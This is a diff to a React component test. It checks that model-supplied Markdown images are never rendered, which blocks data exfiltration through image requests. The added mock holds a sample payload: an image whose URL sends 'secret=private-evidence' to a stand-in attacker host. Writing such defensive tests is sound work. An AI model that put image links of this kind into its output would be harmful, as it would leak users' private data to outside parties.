@@ -9,7 +9,16 @@ jest.mock("rehype-highlight", () => ({}));
 jest.mock("react-file-icon", () => ({ FileIcon: () => null }));
 jest.mock("react-markdown", () => function MockMarkdown({ components }: any) {
   const Link = components.a;
-  return <><Link href="#citation-1">[1]</Link><Link href="https://example.com">Original link</Link></>;
+  const Image = components.img;
+  return <><Link href="#citation-1">[1]</Link><Link href="https://example.com">Original link</Link>
+    <Image src="https://attacker.invalid/collect?secret=private-evidence" alt="Research image" /></>;
+});
+
+it("never creates an image request from model-supplied Markdown", () => {
+  const { container } = render(<Answer markdown="Untrusted model answer" />);
+  expect(screen.getByText("[Image omitted: Research image]")).toBeVisible();
+  expect(container.querySelector("img")).toBeNull();
+  expect(container.innerHTML).not.toContain("attacker.invalid");
 });
 
 it("opens the current source immediately when streaming citations arrive", () => {
